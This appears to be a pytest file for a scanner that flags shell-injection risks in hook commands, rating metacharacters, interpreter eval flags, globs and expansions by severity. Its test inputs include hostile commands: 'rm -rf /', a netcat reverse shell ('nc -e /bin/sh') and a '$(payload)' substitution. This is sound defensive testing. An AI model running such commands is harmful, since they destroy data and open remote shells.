"""EXT-3 — the shell-injection surface checklist."""
from __future__ import annotations

from ordessa_extensions.definitions import HookDefinition
from ordessa_extensions.security import (
    findings_digest, has_high, scan_command, scan_definition,
)


def make(command):
    return HookDefinition(
        hook_id="scan-me", event="PreToolUse", action_kind="command",
        command=command, handler_ref=None, timeout_seconds=10,
        run_async=False, pin="0.147.0",
        content_sha256="sha256:" + "cd" * 32)


def test_clean_argv_produces_no_findings():
    assert scan_command(("notify-send", "session", "started")) == ()
    assert scan_definition(make(("systemd-notify", "--ready"))) == ()


def test_shell_metachar_is_high():
    findings = scan_command(("bash", "-lc", "echo hi; rm -rf /"))
    assert has_high(findings)
    rules = {f.rule for f in findings}
    assert "SHELL_METACHAR" in rules or "INTERPRETER_HEADLINE" in rules


def test_pipe_backtick_redirection_quotes_parens_all_flag():
    for element in ("a|b", "a&b", "a`b`", "a>b", "a<b", "a\nb",
                    'say "x"', "it's", "(sub)"):
        findings = scan_command((element,))
        assert has_high(findings), element


def test_backslash_is_a_medium_escape_face_not_high():
    # round 10: a lone backslash is an escape face (approver visibility),
    # not an automatic HIGH refusal
    findings = scan_command(("path", "a\\b"))
    assert not has_high(findings)
    assert any(f.rule == "EXPANSION_FACE" and f.severity == "medium"
               for f in findings)


def test_dollar_paren_is_shell_injection_face():
    assert has_high(scan_command(("run", "$(payload)")))


def test_interpreter_with_eval_flag_is_high():
    for head in ("sh", "bash", "python3", "node", "eval", "powershell.exe"):
        assert has_high(scan_command((head, "-c", "x"))), head


def test_eval_flag_glued_payload_is_high():
    # round 16: `-ccmd` / `-c'code'` glue the payload onto the flag —
    # startswith matching over-refuses exotic flags on purpose (safe
    # direction)
    assert has_high(scan_command(("python", "-ccmd")))
    assert has_high(scan_command(("sh", "-lc", "x")))


def test_interpreter_bypasses_are_caught():
    # round 14: wrapper + versioned spellings cannot dodge the HIGH face
    for argv in (("busybox", "sh", "-c", "nc -e /bin/sh host 5"),
                 ("env", "python", "-c", "import os"),
                 ("python3.11", "-c", "import os"),
                 ("/usr/bin/env", "python3", "--eval", "1")):
        assert has_high(scan_command(argv)), argv


def test_bare_interpreter_running_a_script_is_medium():
    # round 13: `python3 /path/tool.py` is approvable content — the
    # approver sees the face (MEDIUM), the line is not auto-refused
    findings = scan_command(("python3", "/opt/tools/notify.py", "--flag"))
    assert not has_high(findings)
    assert any(f.rule == "INTERPRETER_FACE" and f.severity == "medium"
               for f in findings)


def test_env_expansion_and_glob_are_medium_only():
    findings = scan_command(("tool", "$HOME/bin", "logs/*"))
    assert not has_high(findings)
    rules = {f.rule for f in findings}
    assert rules == {"EXPANSION_FACE", "GLOB_FACE"}
    assert all(f.severity == "medium" for f in findings)


def test_glob_anywhere_in_the_element_is_a_finding():
    # mid-string glob faces count too (review round 8): logs/*.txt
    for element in ("logs/*.txt", "data?stage", "a*b"):
        findings = scan_command(("tool", element))
        assert any(f.rule == "GLOB_FACE" for f in findings), element


def test_findings_digest_pins_the_scanned_surface():
    one = scan_command(("tool", "$X"))
    again = scan_command(("tool", "$X"))
    other = scan_command(("tool", "$Y"))
    assert findings_digest(one) == findings_digest(again)
    assert findings_digest(one) != findings_digest(other)
    assert findings_digest(()).startswith("sha256:")


def test_handler_definitions_have_no_command_surface():
    definition = HookDefinition(
        hook_id="handler-hook", event="SessionStart", action_kind="handler",
        command=None, handler_ref="recorder", timeout_seconds=5,
        run_async=True, pin="0.147.0",
        content_sha256="sha256:" + "ef" * 32)
    assert scan_definition(definition) == ()
